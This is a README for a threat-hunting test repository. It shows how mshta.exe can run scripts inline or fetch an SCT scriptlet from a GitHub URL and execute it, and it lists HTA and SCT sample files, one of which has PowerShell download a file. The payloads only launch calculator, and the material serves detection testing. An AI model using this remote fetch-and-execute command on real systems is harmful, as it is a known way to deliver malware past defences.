# TestThreatHunting
Using mshta.exe to preform scripts inline or from a URL

Test the following:
- mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/0xMo/TestThreatHunting/main/SCT%20files/PS1.sct')).Exec();close();
  - The will run a script from a URL to run calculator.
- Save the content of the file "**MaliciousHTA.hta**" & "**m.hta**" locally and double click it to run a calculator.
  - Both contains VBScript but different code written to run a program.
- Save the content of the file "**JS_URL**" and double click it to run a acript from a URL tthat will run a calculator.

# Files
<h3>What is SCT file extension</h3>

Component Object Model (COM) is a software component of windows as they store the scripts of software products installed on the user machine. This script includes (VBScript, JavaScript, or JScript, etc.), this unmanaged codes are stored in .SCT format.

<h3>What is HTA file extension</h3>

HTML Application (HTA) files have the file extension hta.HTA's are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.

<h3>List of files</h3>

- MaliciousHTA.hta:
  - This files contains a HTML code with VBScript saved in HTA file that will run a calculator.
- JS_URL.hta:
  - contains an HTML code with JavaScript that will run a script from a URL.
- m.hta:
  - This files contains a HTML code with VBScript saved in HTA file that will run a calculator.
- test1.hta:
  - An HTML code conatins VBScript save in HTA file that will run a calculator sing the Wscript.Shell.
- test2.hta:
  - An HTML code conatins VBScript save in HTA file that will run a PowerShell command to download a text file.

- Hello.sct:
  - This files contains a HTML code saved in SCT file that will run a calculator.
- PS1.sct:
  - Contains a XML code with JScript that will run calculator.
- 
